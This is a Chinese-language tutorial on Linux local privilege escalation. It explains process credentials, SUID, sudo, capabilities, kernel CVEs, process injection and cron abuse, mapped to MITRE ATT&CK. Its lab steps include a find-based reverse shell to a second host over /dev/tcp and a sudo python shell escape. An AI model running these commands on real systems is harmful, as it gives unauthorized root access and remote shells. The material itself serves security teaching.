# 本地提权攻击技术

---

## 1. 概述

### 1.1 什么是本地提权

本地提权（Local Privilege Escalation）是指攻击者在已获得目标系统低权限访问的情况下，通过利用系统漏洞、配置错误或设计缺陷，将自身权限提升至更高级别（通常是 root 权限）的攻击技术。



### 1.2 MITRE ATT&CK 框架分类

在 MITRE ATT&CK 框架中，本地提权相关技术主要归类于 **Privilege Escalation (TA0004)** 战术，包含以下主要技术：

| 技术 ID | 技术名称 | 描述 |
|---------|---------|------|
| T1548 | Abuse Elevation Control Mechanism | 滥用权限提升控制机制 |
| T1548.001 | Setuid and Setgid | 利用 SUID/SGID 位 |
| T1548.003 | Sudo and Sudo Caching | 利用 Sudo 配置 |
| T1068 | Exploitation for Privilege Escalation | 利用漏洞提权 |
| T1055 | Process Injection | 进程注入 |
| T1611 | Escape to Host | 容器逃逸 |
| T1547.006 | Kernel Modules and Extensions | 内核模块加载 |
| T1574.006 | Dynamic Linker Hijacking | 动态链接器劫持 |



### 1.3 Linux 权限模型与本地提权的本质

理解本地提权需要首先了解 Linux 的权限模型，更重要的是理解**提权在系统层面意味着什么**。

#### 1.3.1 权限的本质：进程凭证

在 Linux 中，每个进程都有一个**凭证结构（struct cred）**，这是内核用来判断进程权限的核心数据：

```c
struct cred {
    kuid_t      uid;            // 真实用户ID UID（谁启动了这个进程）
    kgid_t      gid;            // 真实组ID GID
    kuid_t      euid;           // 有效用户ID UID（实际权限判断依据）
    kgid_t      egid;           // 有效组ID GID
    kuid_t      suid;           // 保存的用户ID UID（用于权限切换）
    kgid_t      sgid;           // 保存的组ID GID
    kuid_t      fsuid;          // 文件系统用户ID UID（文件操作权限）
    kgid_t      fsgid;          // 文件系统组ID GID
    kernel_cap_t cap_inheritable;   // 可继承能力
    kernel_cap_t cap_permitted;     // 允许的能力
    kernel_cap_t cap_effective;     // 有效能力（实际生效的能力）
    kernel_cap_t cap_bset;          // 能力边界集
    kernel_cap_t cap_ambient;       // 环境能力
};
```

**本地提权的本质就是：通过某种方式修改当前进程（或获得新进程）的 cred 结构，使其拥有更高权限。**

#### 1.3.2 权限检查的关键字段

当进程执行敏感操作时，内核会检查以下字段：

| 字段 | 作用 | 提权目标 |
|------|------|----------|
| **euid** | 决定大多数权限检查（文件访问、进程操作等） | euid=0 即为 root |
| **egid** | 决定组相关的权限 | 特权组如 docker、wheel |
| **cap_effective** | 当前生效的 capabilities | 获取 CAP_SYS_ADMIN 等 |
| **fsuid** | 文件系统操作的权限判断 | fsuid=0 可读写任意文件 |

#### 1.3.3 合法的权限提升机制

Linux 设计了几种**合法的**权限提升机制，这些正是攻击者滥用的目标：

**1. SUID/SGID 位**
```
普通用户执行 SUID 程序时：
  uid=1000 (用户本身)  →  euid=0 (文件所有者 root)

这就是为什么 passwd 命令能修改 /etc/shadow：
  $ ls -l /usr/bin/passwd
  -rwsr-xr-x 1 root root ... /usr/bin/passwd
     ↑
     s 表示 SUID 位
```

**2. Sudo 机制**
```
sudo 程序本身是 SUID root，它读取 /etc/sudoers：
  1. 验证用户身份和权限配置
  2. 以 root 身份 fork 子进程执行命令
  3. 子进程继承 root 的 cred

示例：
  $ id
  uid=1000(alice) gid=1000(alice) groups=1000(alice)

  $ sudo id
  uid=0(root) gid=0(root) groups=0(root)

  # 查看 sudo 本身的权限
  $ ls -l /usr/bin/sudo
  -rwsr-xr-x 1 root root ... /usr/bin/sudo
```

**3. Capabilities 继承**

```
进程 fork/exec 时，capabilities 按规则传递：
  - cap_ambient: 普通程序可继承
  - cap_inheritable: 结合文件 capabilities 生效
  - cap_bset: 能力边界，限制可获得的最大能力

示例：给 ping 命令设置 CAP_NET_RAW（不用 SUID 也能发 ICMP）
  $ sudo setcap cap_net_raw+ep /usr/bin/ping

  $ getcap /usr/bin/ping
  /usr/bin/ping = cap_net_raw+ep

  # 普通用户执行 ping 时，进程获得 CAP_NET_RAW
  $ getpcaps $$    # 查看当前 shell 的 capabilities

示例：Python 获得 CAP_NET_BIND_SERVICE（绑定 <1024 端口）
  $ sudo setcap cap_net_bind_service+ep /usr/bin/python3
  # 现在普通用户的 python3 可以监听 80 端口
```


#### 1.3.4 本地提权的攻击路径

| 攻击类型 | 具体手法 | 提权结果 |
|----------|----------|----------|
| **滥用合法机制** | SUID 程序利用（GTFOBins）、Sudo 配置错误、高危 Capabilities | 进程获得 euid=0 或关键 capabilities |
| **利用内核漏洞** | 内存破坏（溢出/UAF）、逻辑漏洞（权限检查绕过）、竞态条件（Dirty COW） | 直接在内核态覆写 cred 结构 |
| **配置/权限问题** | 敏感文件可写（/etc/passwd）、cron 任务可劫持、服务配置错误 | 间接获得 root shell |


#### 1.3.5 内核漏洞提权的典型流程

以内核漏洞利用为例，提权的技术流程通常是：

```c
// 1. 触发漏洞获得内核任意读写能力

// 2. 定位当前进程的 task_struct
struct task_struct *current_task = ...;

// 3. 找到 cred 结构
struct cred *cred = current_task->cred;

// 4. 直接覆写为 root 权限
cred->uid = cred->euid = cred->suid = cred->fsuid = 0;
cred->gid = cred->egid = cred->sgid = cred->fsgid = 0;
cred->cap_effective = cred->cap_permitted = CAP_FULL_SET;

// 5. 返回用户态，当前 shell 已是 root
```

这就是为什么 Dirty COW、Dirty Pipe 等漏洞能实现提权——它们提供了绕过正常权限检查直接修改内核数据的能力。

#### 1.3.6 为什么这些机制会被滥用

| 机制 | 设计初衷 | 为何成为攻击目标 |
|------|----------|------------------|
| SUID | 让普通用户执行需要特权的操作（如改密码） | 可利用的 SUID 程序太多，如 vim、find 等可逃逸到 shell |
| Sudo | 细粒度授权，减少直接使用 root | 配置复杂易出错，通配符和命令组合可被利用 |
| Capabilities | 比 SUID 更细粒度的权限控制 | 某些 capability（如 SYS_ADMIN）权限过大 |
| Cred 结构 | 存储进程权限信息 | 内核漏洞可直接覆写，绕过所有用户态检查 |

---

## 2. 本地提权攻击手法

### 2.1 SUID/SGID 滥用

**原理**：
SUID（Set User ID）位允许用户以文件所有者的权限执行程序。当 root 拥有的可执行文件设置了 SUID 位，任何用户执行它时都会以 root 权限运行。

**攻击向量**：
1. **已知 SUID 二进制利用**：利用 find、vim、python 等设置了 SUID 位的程序逃逸
2. **自定义 SUID 程序漏洞**：利用开发者编写的 SUID 程序中的缓冲区溢出、命令注入等漏洞
3. **环境变量注入**：通过 PATH、LD_PRELOAD 等环境变量影响 SUID 程序行为

**常见可利用的 SUID 程序**（GTFOBins）：

```
/usr/bin/find
/usr/bin/vim
/usr/bin/python
/usr/bin/perl
/usr/bin/bash
/usr/bin/awk
```

实验步骤：

1、查找具有suid权限的文件，发现没有find文件

```
find / -perm -u=s -type f 2>/dev/null
```

2、切换到root用户，赋予find文件suid权限

```
chmod u+s /usr/bin/find
```

3、构造反弹shell

格式如下：

\# find  (一个路径或文件必须存在)  -exec  执行命令 （结束）\;

先在另一个linux xshell终端下执行

使用nc监听6666

```
nc -lvvnp 6666
```



执行反弹shell命令

```
find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.0.129/6666 0>&1 \;
```

反弹shell成功，并且是root用户的权限



### 2.2 Sudo 配置错误

**原理**：
Sudo 允许管理员授予用户以其他用户（通常是 root）身份执行命令的权限。配置不当会导致权限提升。

**攻击向量**：
1. **通配符滥用**：`user ALL=(ALL) /usr/bin/vim *` 允许编辑任意文件
2. **NOPASSWD 配置**：允许无密码执行特权命令
3. **可写脚本执行**：用户有权执行可写的脚本文件
4. **LD_PRELOAD 保留**：env_keep 保留了危险的环境变量
5. **Sudo 版本漏洞**：如 CVE-2021-3156 (Baron Samedit)

**危险配置示例**：

```
# 危险：允许执行任意 shell 命令
user ALL=(root) /usr/bin/vim

# 危险：通配符可被利用
user ALL=(root) /usr/bin/python /opt/scripts/*.py

# 危险：保留 LD_PRELOAD
Defaults env_keep += "LD_PRELOAD"
```

实验步骤：

**1、创建一个普通用户user1**

**2、修改/etc/sudoers文件**

vim /etc/sudoers，添加以下语句，使得用sudo执行python命令时不需要密码

**3、提权**

此时我们就可以利用python命令进行提权了

提权命令如下：

```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```



### 2.3 Linux Capabilities 滥用

Capabilities 是 Linux 将 root 权限细分后的产物。某些 Capability 可被滥用获得完整 root 权限。

> 详细内容参见 [Linux Capabilities 详解](./linux-capabilities.md)

高危 Capabilities 速查：
- **CAP_SYS_ADMIN**：几乎等于 root，可挂载文件系统、修改内核参数等
- **CAP_SYS_MODULE**：加载内核模块 = 内核态任意代码执行
- **CAP_SYS_PTRACE**：调试任意进程，可注入代码
- **CAP_SETUID/SETGID**：直接切换到 root
- **CAP_DAC_OVERRIDE**：绕过文件权限，读写任意文件

### 2.4 内核漏洞利用

**原理**：
利用 Linux 内核中的漏洞（如缓冲区溢出、竞态条件、类型混淆等）直接获取内核态权限。

**著名漏洞**：

| 漏洞 | CVE | 影响版本 | 类型 |
|------|-----|---------|------|
| Dirty COW | CVE-2016-5195 | 2.x - 4.8.x | 竞态条件 |
| Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16.10 | 管道缓冲区覆写 |
| OverlayFS | CVE-2023-0386 | 5.11 - 6.2 | OverlayFS 权限绕过 |
| nftables | CVE-2023-32233 | 5.x - 6.x | UAF |
| io_uring | CVE-2022-29582 | 5.10 - 5.17 | UAF |

**利用特点**：
- 通常需要针对特定内核版本
- 利用成功后直接获得 root 权限
- 可能导致系统不稳定

**MITRE ATT&CK ID**：T1068

### 2.5 进程注入

**原理**：
向其他进程注入代码，以该进程的权限执行恶意操作。

**技术分类**：

1. **Ptrace 注入**：
   - 使用 ptrace 系统调用附加到目标进程
   - 修改内存或寄存器注入代码
   - 需要 CAP_SYS_PTRACE 或同一用户

2. **/proc/[pid]/mem 注入**：
   - 直接写入进程内存空间
   - 需要相同用户或 root 权限

3. **LD_PRELOAD 注入**：
   - 在进程启动时加载恶意共享库
   - 适用于新启动的进程

4. **process_vm_writev 注入**：
   - 使用 process_vm_writev 系统调用
   - 直接跨进程写入内存

**MITRE ATT&CK ID**：T1055

### 2.6 内核模块加载

**原理**：
加载恶意内核模块（LKM）直接在内核态执行代码，获得最高权限。

**攻击方式**：

1. **直接加载恶意模块**：使用 insmod/modprobe 加载
2. **替换合法模块**：替换系统使用的内核模块
3. **Rootkit 植入**：隐藏进程、文件、网络连接

**检测难点**：
- 内核态代码难以监控
- 可修改系统调用表
- 可隐藏自身

**MITRE ATT&CK ID**：T1547.006

### 2.7 LD_PRELOAD/动态链接器劫持

**原理**：
通过设置 LD_PRELOAD 环境变量或修改 /etc/ld.so.preload，在程序运行时加载恶意共享库。

**攻击向量**：
1. **LD_PRELOAD 环境变量**：影响新启动的进程
2. **/etc/ld.so.preload 文件**：全局预加载
3. **/etc/ld.so.conf 修改**：添加恶意库搜索路径
4. **RPATH 利用**：利用二进制文件中的 RPATH 设置

**防护措施**：
- SUID 程序默认忽略 LD_PRELOAD
- 使用静态链接
- 设置 RELRO 保护

**MITRE ATT&CK ID**：T1574.006

### 2.8 计划任务滥用

**原理**：
利用 cron、systemd timer、at 等计划任务机制执行特权命令。

**攻击向量**：
1. **可写的 cron 脚本**：修改 root 的 cron 任务执行的脚本
2. **cron.d 目录写入**：添加恶意 cron 任务
3. **systemd timer 滥用**：创建或修改 systemd 定时器
4. **通配符注入**：利用 cron 命令中的通配符

**常见目标**：
```
/etc/crontab
/etc/cron.d/
/var/spool/cron/
/etc/cron.{hourly,daily,weekly,monthly}/
```

**MITRE ATT&CK ID**：T1053

### 2.9 文件权限配置错误

**原理**：
利用敏感文件或目录的不当权限进行提权。

**常见目标**：
| 文件/目录 | 利用方式 |
|-----------|----------|
| /etc/passwd | 添加 root 用户 |
| /etc/shadow | 修改 root 密码哈希 |
| /etc/sudoers | 添加 sudo 权限 |
| /root/.ssh/authorized_keys | 添加 SSH 公钥 |
| /etc/cron.d/ | 添加 cron 任务 |
| SUID 程序的库路径 | 库劫持 |

**MITRE ATT&CK ID**：T1222

---

## 3. 攻击手法总结

本地提权攻击主要利用以下弱点：

1. **配置错误**：SUID、Sudo、文件权限
2. **软件漏洞**：内核、SUID 程序、特权服务
3. **设计缺陷**：Capabilities 细粒度不足、容器隔离不完善
4. **运维疏忽**：未及时修补、默认配置

---

## 4. 参考资料

- [Linux Capabilities 详解](./linux-capabilities.md) - Capabilities 机制与提权风险
- [GTFOBins](https://gtfobins.github.io/) - Unix 二进制利用
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

- [MITRE ATT&CK - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
